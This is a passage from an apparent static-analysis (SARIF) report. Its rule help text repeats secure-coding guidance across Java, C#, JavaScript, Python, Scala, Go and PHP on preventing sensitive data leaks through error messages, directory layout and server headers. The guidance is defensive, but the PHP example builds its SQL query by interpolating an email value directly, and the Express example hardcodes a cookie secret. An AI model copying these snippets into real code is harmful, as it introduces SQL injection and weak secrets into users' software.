This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In the Gunicorn WSGI container, you can configure this header in your `gunicorn.conf.py` config \nfile:\n\n```python\nimport gunicorn\n\n# Make the server name completely generic.\ngunicorn.SERVER_SOFTWARE = 'Server'\n```\n\n:::\n\n:::tab[Scala]\n\n## How to Prevent Data Leaks in Scala\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Notice how the Play framework uses different error\npages in development and production modes:\n\n```scala\n  /**\n   * Invoked in dev mode when a server error occurs.\n   */\n  protected def onDevServerError(request: RequestHeader, exception: UsefulException): Future[Result] = {\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.devError(playEditor, exception))\n    }\n  }\n\n  /**\n   * Invoked in prod mode when a server error occurs.\n   */\n  protected def onProdServerError(request: RequestHeader, exception: UsefulException): Future[Result] =\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.error(exception))\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```scala\n  override def onServerError(request: RequestHeader, exception: Throwable): Future[Result] = {\n    try {\n      val usefulException = HttpErrorHandlerExceptions.throwableToUsefulException(sourceMapper, !config.showDevErrors, exception)\n\n      // Write the full error context and stack trace to the log file.\n      logServerError(request, usefulException)\n\n      // Sanitize the error to be displayed to the user, when in production-mode.\n      if (config.showDevErrors) onDevServerError(request, usefulException)\n      else onProdServerError(request, usefulException)\n    } catch {\n      case NonFatal(e) =>\n        logger.error(\"Error while handling error\", e)\n        Future.successful(InternalServerError(fatalErrorMessage(request, e)))\n    }\n  }\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. In the Play framework, static assets like JavaScript and CSS files are \ntypically kept in a separate `/public` and mapped in the routes file as follows:\n\n```scala\nGET  /assets/*file        controllers.Assets.at(path=\"/public\", file)\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. For example, the Akka web-server allows you to disable these headers through configuration options:\n\n```\nakka.http {\n  server {\n    # The default value of the `Server` header to produce if no\n    # explicit `Server`-header was included in a response.\n    # If this value is the empty string and no header was included in\n    # the request, no `Server` header will be rendered at all.\n    server-header = \"\" # akka-http/${akka.http.version}\n  }  \n}\n```\n\n:::\n\n:::tab[Go]\n\n## How to Prevent Data Leaks in Go\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. In Go web applications, you typically end up writing\nyour own error pages. Ensure that any pages that handle errors pay use flags to distinguish the environment they are \nexecuting in:\n\n```go\nimport \"flag\"\n\nvar debug = flag.Bool(\"debug\", false, \"Whether to show full error messages on the client\")\n```\n\nA default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page can show more information, like full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Go functions typically return error codes when then fail, and web handlers will return early when error conditions \noccur. Ensure such code does not leak sensitive system data.\n\n```go\nsession, err := session.Get(request, \"session\")\n\nif err != nil {\n  // The second argument here is returned directly to the client, which leaks information!\n  http.Error(response, err.Error(), http.StatusInternalServerError)\n  return\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Gorilla web framework:\n\n```go\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  log.Fatal(server.ListenAndServe())\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## How to Prevent Data Leaks in PHP\n\n### Keep Error Reporting on the Server\n\nDisable error reporting to the client in your production environment by setting the `display_errors` directive to `Off` in your `php.ini`:\n\n```ini\ndisplay_errors = Off\n```\n\nYou should instead log the errors for review. Ensure that `log_errors` directive is set to `On`:\n\n```ini\nlog_errors = On\nerror_log = /path/to/php-error.log\n```\n\n### Sanitize Error Messages\n\nAvoid directly echoing out database or system error messages to the user. Instead, present a generic message while logging the exact error for debugging:\n\n```php\ntry \n{\n    $result = $db->query(\"SELECT * FROM users WHERE email = '$email'\");\n}\ncatch (PDOException $e) \n{\n    error_log(\"Database error: \" . $e->getMessage());\n    echo \"An unexpected error occurred, please try again later.\";\n}\n```\n\n### Separate Dynamic and Static Resources\n\nFor websites or web applications using PHP, it's common to store PHP files in one directory and static resources (e.g., images, stylesheets, and JavaScript files) in separate directories. This way, you can use server configurations to ensure direct access to PHP files is restricted.\n\n### Hide PHP Version Information\n\nThe `X-Powered-By` header can give away the PHP version you're running. To hide this:\n\n1. Edit `php.ini` and update:\n\n```ini\nexpose_php = Off\n```\n\nOr, if you're using an `.htaccess` file on an Apache server:\n\n```apache\nHeader unset X-Powered-By\n```\n\n### Be Careful With Comments\n\nAvoid leaving sensitive or internal-only comments in your PHP files. Even if you think they are in a part of the code that doesn't output to the user, mistakes or changes in the codebase could expose them. Always assume that anything in a code file could potentially be exposed.\n\n:::\n\n::::\n\n## Further Considerations\n\n* Ensure any comments in template files don't contain sensitive data! It's easy to leave in notes about server names\n  and addresses that will get passed to the client-side. Attackers know this, and will scan comments in HTML for IP\n  addresses and URLs.\n  \n* Ensure server-side log messages do not contain sensitive information like passwords or credit card numbers - this \n  should mitigate the harm an attacker can do if they manage to steal your server's log files.\n  \n\n## Additional information\n\n**[CWE-200](https://cwe.mitre.org/data/definitions/200.html)**\n\n**[OWASP-A3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)**",
                                "text": "Sensitive data is logged in this flow.\n\n# Sensitive Data Leaks\n\nDisclosing system information helps an adversary learn about your web application and form a plan of attack. You should\ntry to reveal as little about your technology stack and architecture as possible, beyond what is essential for your\nusers to know. Revealing system information makes life easier for an attacker, and gives them a playbook of\nvulnerabilities they can probe for.\n\nHere are some common ways websites leak sensitive data:\n\n* Error conditions that display stack traces or database error messages to the user.\n* Open directory listings that allow exploration of the server's file system.\n* Unsanitized comments in HTML and template files the reveal system details.\n\n::::tabs\n\n:::tab[Java]\n\n## How to Prevent Data Leaks in Java\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment, by specifying an error page in your `web.xml` file:\n\n```xml\n<error-page>\n  <location>/error.html</location>\n</error-page>\n```\n  \nThis error page should only contain a generic error message (e.g. \"An error occurred\"). Stack traces should be written\nto server-side logs.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the\nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```java\ntry \n{\n    user = getDatabase().findUser(email);\n}\ncatch (SQLException ex) \n{\n    log.error(\"An error occurred looking up the user profiles\", ex):\n    throw new ClientFacingException(\"An unexpected error occurred, please try again later.\");\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Java to server static Javascript files\nfrom the `/js` directory:\n  \n```xml\n<servlet-mapping>\n    <servlet-name>default</servlet-name>\n    <url-pattern>/js/*.js</url-pattern>\n</servlet-mapping>\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in the Jetty web-server:\n  \n```java\nHttpConfiguration.setSendServerVersion(false);\n```\n\n:::\n\n:::tab[C#]\n\n## How to Prevent Data Leaks in C#\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. When you create a new ASP.NET application, the \ntemplate will generate a startup class with some configuration logic:\n\n```csharp\n    public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n    {\n        if (env.IsDevelopment())\n        {\n            app.UseDeveloperExceptionPage();\n        }\n        else\n        {\n            app.UseExceptionHandler(\"/Home/Error\");\n        }\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the ASP.NET web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation. You can configure the error page that is generated at\n`/Views/Shared/Errors.cs.html`.\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. An ASP.NET web application can be configured to serve static content under\nthe `wwwroot` directory by adding the following line in the startup configuration:\n\n```csharp\napp.UseStaticFiles();\n```\n\nYou can also add additional static content directories with the following logic:\n\n```csharp\napp.UseStaticFiles(new StaticFileOptions\n{\n    FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"MyStaticFiles\")),\n    RequestPath = \"/StaticFiles\"\n});\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In ASP.NET, you can programmatically remove it in the following manner:\n\n```csharp\nHttpContext.Current.Response.Headers.Remove(\"Server\");\n```\n\nIf you are deploying to IIS, you can remove the header in your configuration settings:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n    <system.webServer>\n        <security>\n            <requestFiltering removeServerHeader=\"true\" />\n        </security>\n    </system.webServer>\n</configuration>\n```\n\n:::\n\n:::tab[JavaScript]\n\n## How to Prevent Data Leaks in JavaScript\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. This Express server will dump stack trace \ninformation only in the `development` environment, and disable it in `production`:\n  \n```javascript\nconst errorhandler = require('errorhandler')\nconst express      = require('express')\n\nconst app = express()\n\napp.use(errorhandler({\n  dumpExceptions : app.get('env') === 'development',\n  showStack      : app.get('env') === 'development'\n}))\n```\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database are logged, but not shown to the user. Here a generic error \nmessage is shown to the user, while the detailed error is written to the logs for investigation:\n\n```javascript\napp.get('/profile', (request, response) => {\n  db.run('SELECT * FROM USERS WHERE email = ?', [ request.session.user ], (error, user) => {\n    if (error) {\n      log.error(error)\n      response.send('An unexpected error occurred')\n      return\n    }\n\n    response.send(`<p>Your email is ${user.email}</p>`)\n  })\n})\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Expression to server static content (like \nclient-side JavaScript and CSS files) from the `/static` directory:\n  \n```javascript\napp.use(express.static(__dirname + '/static'))\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in Express:\n  \n```javascript\n// Disable the 'X-Powered-By' header.\napp.disable('x-powered-by')\n\nconst cookieParser = require('cookie-parser')\nconst session      = require('express-session')\n\napp.use(cookieParser('secret'))\napp.use(session({\n  cookie : {\n    maxAge   : 60000,\n    httpOnly : true,\n    sameSite : 'strict',\n    secure   : app.get('env') !== 'development'\n  },\n\n  // Make the session cookie name generic.\n  name   : 'session',\n  secret : process.env.SESSION_SECRET || uid.sync(18)\n}))\n```\n\n:::\n\n:::tab[Python]\n\n## How to Prevent Data Leaks in Python\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Observe how the Flask framework uses different error\npages in development and production modes, distinguished by whether the environment variable `FLASK_ENV` is set to\n`development`:\n\n```python\n  @property\n  def debug(self) -> bool:\n     \"\"\"Whether debug mode is enabled. When using ``flask run`` to start\n     the development server, an interactive debugger will be shown for\n     unhandled exceptions, and the server will be reloaded when code\n     changes. This maps to the :data:`DEBUG` config key. This is\n     enabled when :attr:`env` is ``'development'`` and is overridden\n     by the ``FLASK_DEBUG`` environment variable. It may not behave as\n     expected if set in code.\n\n     **Do not enable debug mode when deploying in production.**\"\"\"\n     return self.config[\"DEBUG\"]\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces, and even allow interactive execution of Python code.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the Flask web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation:\n\n```python\n  def log_exception(self, exc_info) -> None:\n    \"\"\"Logs an exception.  This is called by :meth:`handle_exception`\n    if debugging is disabled and right before the handler is called.\n    The default implementation logs the exception as error on the\n    :attr:`logger`.\n    \"\"\"\n    self.logger.error(\n        f\"Exception on {request.path} [{request.method}]\", exc_info=exc_info\n    )\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Flask web-server:\n\n```python\nfrom flask import Flask\n\napp = Flask(__name__, static_folder='static')\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In the Gunicorn WSGI container, you can configure this header in your `gunicorn.conf.py` config \nfile:\n\n```python\nimport gunicorn\n\n# Make the server name completely generic.\ngunicorn.SERVER_SOFTWARE = 'Server'\n```\n\n:::\n\n:::tab[Scala]\n\n## How to Prevent Data Leaks in Scala\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Notice how the Play framework uses different error\npages in development and production modes:\n\n```scala\n  /**\n   * Invoked in dev mode when a server error occurs.\n   */\n  protected def onDevServerError(request: RequestHeader, exception: UsefulException): Future[Result] = {\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.devError(playEditor, exception))\n    }\n  }\n\n  /**\n   * Invoked in prod mode when a server error occurs.\n   */\n  protected def onProdServerError(request: RequestHeader, exception: UsefulException): Future[Result] =\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.error(exception))\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```scala\n  override def onServerError(request: RequestHeader, exception: Throwable): Future[Result] = {\n    try {\n      val usefulException = HttpErrorHandlerExceptions.throwableToUsefulException(sourceMapper, !config.showDevErrors, exception)\n\n      // Write the full error context and stack trace to the log file.\n      logServerError(request, usefulException)\n\n      // Sanitize the error to be displayed to the user, when in production-mode.\n      if (config.showDevErrors) onDevServerError(request, usefulException)\n      else onProdServerError(request, usefulException)\n    } catch {\n      case NonFatal(e) =>\n        logger.error(\"Error while handling error\", e)\n        Future.successful(InternalServerError(fatalErrorMessage(request, e)))\n    }\n  }\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. In the Play framework, static assets like JavaScript and CSS files are \ntypically kept in a separate `/public` and mapped in the routes file as follows:\n\n```scala\nGET  /assets/*file        controllers.Assets.at(path=\"/public\", file)\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. For example, the Akka web-server allows you to disable these headers through configuration options:\n\n```\nakka.http {\n  server {\n    # The default value of the `Server` header to produce if no\n    # explicit `Server`-header was included in a response.\n    # If this value is the empty string and no header was included in\n    # the request, no `Server` header will be rendered at all.\n    server-header = \"\" # akka-http/${akka.http.version}\n  }  \n}\n```\n\n:::\n\n:::tab[Go]\n\n## How to Prevent Data Leaks in Go\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. In Go web applications, you typically end up writing\nyour own error pages. Ensure that any pages that handle errors pay use flags to distinguish the environment they are \nexecuting in:\n\n```go\nimport \"flag\"\n\nvar debug = flag.Bool(\"debug\", false, \"Whether to show full error messages on the client\")\n```\n\nA default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page can show more information, like full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Go functions typically return error codes when then fail, and web handlers will return early when error conditions \noccur. Ensure such code does not leak sensitive system data.\n\n```go\nsession, err := session.Get(request, \"session\")\n\nif err != nil {\n  // The second argument here is returned directly to the client, which leaks information!\n  http.Error(response, err.Error(), http.StatusInternalServerError)\n  return\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Gorilla web framework:\n\n```go\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  log.Fatal(server.ListenAndServe())\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## How to Prevent Data Leaks in PHP\n\n### Keep Error Reporting on the Server\n\nDisable error reporting to the client in your production environment by setting the `display_errors` directive to `Off` in your `php.ini`:\n\n```ini\ndisplay_errors = Off\n```\n\nYou should instead log the errors for review. Ensure that `log_errors` directive is set to `On`:\n\n```ini\nlog_errors = On\nerror_log = /path/to/php-error.log\n```\n\n### Sanitize Error Messages\n\nAvoid directly echoing out database or system error messages to the user. Instead, present a generic message while logging the exact error for debugging:\n\n```php\ntry \n{\n    $result = $db->query(\"SELECT * FROM users WHERE email = '$email'\");\n}\ncatch (PDOException $e) \n{\n    error_log(\"Database error: \" . $e->getMessage());\n    echo \"An unexpected error occurred, please try again later.\";\n}\n```\n\n### Separate Dynamic and Static Resources\n\nFor websites or web applications using PHP, it's common to store PHP files in one directory and static resources (e.g., images, stylesheets, and JavaScript files) in separate directories. This way, you can use server configurations to ensure direct access to PHP files is restricted.\n\n### Hide PHP Version Information\n\nThe `X-Powered-By` header can give away the PHP version you're running. To hide this:\n\n1. Edit `php.ini` and update:\n\n```ini\nexpose_php = Off\n```\n\nOr, if you're using an `.htaccess` file on an Apache server:\n\n```apache\nHeader unset X-Powered-By\n```\n\n### Be Careful With Comments\n\nAvoid leaving sensitive or internal-only comments in your PHP files. Even if you think they are in a part of the code that doesn't output to the user, mistakes or changes in the codebase could expose them. Always assume that anything in a code file could potentially be exposed.\n\n:::\n\n::::\n\n## Further Considerations\n\n* Ensure any comments in template files don't contain sensitive data! It's easy to leave in notes about server names\n  and addresses that will get passed to the client-side. Attackers know this, and will scan comments in HTML for IP\n  addresses and URLs.\n  \n* Ensure server-side log messages do not contain sensitive information like passwords or credit card numbers - this \n  should mitigate the harm an attacker can do if they manage to steal your server's log files.\n  \n\n## Additional information\n\n**[CWE-200](https://cwe.mitre.org/data/definitions/200.html)**\n\n**[OWASP-A3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)**"
                            },
                            "helpUri": "https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure",
                            "id": "sensitive-to-log/5282b69472fced914b936043c87fd20e",
                            "name": "Sensitive Data Leak: Sensitive Data Is Leaked Via Username To Log In Mail.js:<Init>",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "8",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 8",
                                    "CWE 117",
                                    "CWE 200",
                                    "OWASP 2021 a01-broken-access-control",
                                    "OWASP a01-2021-broken-access-control",
                                    "OWASP a3-sensitive-data-exposure",
                                    "Sensitive Data Leak"
                                ]
                            },
                            "shortDescription": {
                                "text": "Sensitive Data Leak: Sensitive Data is Leaked via username to Log in Mail.js:<init>"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "error",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Sensitive data is logged in this flow."
                            },
                            "help": {
                                "markdown": "Sensitive data is logged in this flow.\n\n# Sensitive Data Leaks\n\nDisclosing system information helps an adversary learn about your web application and form a plan of attack. You should\ntry to reveal as little about your technology stack and architecture as possible, beyond what is essential for your\nusers to know. Revealing system information makes life easier for an attacker, and gives them a playbook of\nvulnerabilities they can probe for.\n\nHere are some common ways websites leak sensitive data:\n\n* Error conditions that display stack traces or database error messages to the user.\n* Open directory listings that allow exploration of the server's file system.\n* Unsanitized comments in HTML and template files the reveal system details.\n\n::::tabs\n\n:::tab[Java]\n\n## How to Prevent Data Leaks in Java\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment, by specifying an error page in your `web.xml` file:\n\n```xml\n<error-page>\n  <location>/error.html</location>\n</error-page>\n```\n  \nThis error page should only contain a generic error message (e.g. \"An error occurred\"). Stack traces should be written\nto server-side logs.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the\nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```java\ntry \n{\n    user = getDatabase().findUser(email);\n}\ncatch (SQLException ex) \n{\n    log.error(\"An error occurred looking up the user profiles\", ex):\n    throw new ClientFacingException(\"An unexpected error occurred, please try again later.\");\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Java to server static Javascript files\nfrom the `/js` directory:\n  \n```xml\n<servlet-mapping>\n    <servlet-name>default</servlet-name>\n    <url-pattern>/js/*.js</url-pattern>\n</servlet-mapping>\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in the Jetty web-server:\n  \n```java\nHttpConfiguration.setSendServerVersion(false);\n```\n\n:::\n\n:::tab[C#]\n\n## How to Prevent Data Leaks in C#\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. When you create a new ASP.NET application, the \ntemplate will generate a startup class with some configuration logic:\n\n```csharp\n    public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n    {\n        if (env.IsDevelopment())\n        {\n            app.UseDeveloperExceptionPage();\n        }\n        else\n        {\n            app.UseExceptionHandler(\"/Home/Error\");\n        }\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the ASP.NET web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation. You can configure the error page that is generated at\n`/Views/Shared/Errors.cs.html`.\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. An ASP.NET web application can be configured to serve static content under\nthe `wwwroot` directory by adding the following line in the startup configuration:\n\n```csharp\napp.UseStaticFiles();\n```\n\nYou can also add additional static content directories with the following logic:\n\n```csharp\napp.UseStaticFiles(new StaticFileOptions\n{\n    FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"MyStaticFiles\")),\n    RequestPath = \"/StaticFiles\"\n});\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In ASP.NET, you can programmatically remove it in the following manner:\n\n```csharp\nHttpContext.Current.Response.Headers.Remove(\"Server\");\n```\n\nIf you are deploying to IIS, you can remove the header in your configuration settings:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n    <system.webServer>\n        <security>\n            <requestFiltering removeServerHeader=\"true\" />\n        </security>\n    </system.webServer>\n</configuration>\n```\n\n:::\n\n:::tab[JavaScript]\n\n## How to Prevent Data Leaks in JavaScript\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. This Express server will dump stack trace \ninformation only in the `development` environment, and disable it in `production`:\n  \n```javascript\nconst errorhandler = require('errorhandler')\nconst express      = require('express')\n\nconst app = express()\n\napp.use(errorhandler({\n  dumpExceptions : app.get('env') === 'development',\n  showStack      : app.get('env') === 'development'\n}))\n```\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database are logged, but not shown to the user. Here a generic error \nmessage is shown to the user, while the detailed error is written to the logs for investigation:\n\n```javascript\napp.get('/profile', (request, response) => {\n  db.run('SELECT * FROM USERS WHERE email = ?', [ request.session.user ], (error, user) => {\n    if (error) {\n      log.error(error)\n      response.send('An unexpected error occurred')\n      return\n    }\n\n    response.send(`<p>Your email is ${user.email}</p>`)\n  })\n})\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Expression to server static content (like \nclient-side JavaScript and CSS files) from the `/static` directory:\n  \n```javascript\napp.use(express.static(__dirname + '/static'))\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in Express:\n  \n```javascript\n// Disable the 'X-Powered-By' header.\napp.disable('x-powered-by')\n\nconst cookieParser = require('cookie-parser')\nconst session      = require('express-session')\n\napp.use(cookieParser('secret'))\napp.use(session({\n  cookie : {\n    maxAge   : 60000,\n    httpOnly : true,\n    sameSite : 'strict',\n    secure   : app.get('env') !== 'development'\n  },\n\n  // Make the session cookie name generic.\n  name   : 'session',\n  secret : process.env.SESSION_SECRET || uid.sync(18)\n}))\n```\n\n:::\n\n:::tab[Python]\n\n## How to Prevent Data Leaks in Python\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Observe how the Flask framework uses different error\npages in development and production modes, distinguished by whether the environment variable `FLASK_ENV` is set to\n`development`:\n\n```python\n  @property\n  def debug(self) -> bool:\n     \"\"\"Whether debug mode is enabled. When using ``flask run`` to start\n     the development server, an interactive debugger will be shown for\n     unhandled exceptions, and the server will be reloaded when code\n     changes. This maps to the :data:`DEBUG` config key. This is\n     enabled when :attr:`env` is ``'development'`` and is overridden\n     by the ``FLASK_DEBUG`` environment variable. It may not behave as\n     expected if set in code.\n\n     **Do not enable debug mode when deploying in production.**\"\"\"\n     return self.config[\"DEBUG\"]\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces, and even allow interactive execution of Python code.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the Flask web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation:\n\n```python\n  def log_exception(self, exc_info) -> None:\n    \"\"\"Logs an exception.  This is called by :meth:`handle_exception`\n    if debugging is disabled and right before the handler is called.\n    The default implementation logs the exception as error on the\n    :attr:`logger`.\n    \"\"\"\n    self.logger.error(\n        f\"Exception on {request.path} [{request.method}]\", exc_info=exc_info\n    )\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Flask web-server:\n\n```python\nfrom flask import Flask\n\napp = Flask(__name__, static_folder='static')\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In the Gunicorn WSGI container, you can configure this header in your `gunicorn.conf.py` config \nfile:\n\n```python\nimport gunicorn\n\n# Make the server name completely generic.\ngunicorn.SERVER_SOFTWARE = 'Server'\n```\n\n:::\n\n:::tab[Scala]\n\n## How to Prevent Data Leaks in Scala\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Notice how the Play framework uses different error\npages in development and production modes:\n\n```scala\n  /**\n   * Invoked in dev mode when a server error occurs.\n   */\n  protected def onDevServerError(request: RequestHeader, exception: UsefulException): Future[Result] = {\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.devError(playEditor, exception))\n    }\n  }\n\n  /**\n   * Invoked in prod mode when a server error occurs.\n   */\n  protected def onProdServerError(request: RequestHeader, exception: UsefulException): Future[Result] =\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.error(exception))\n    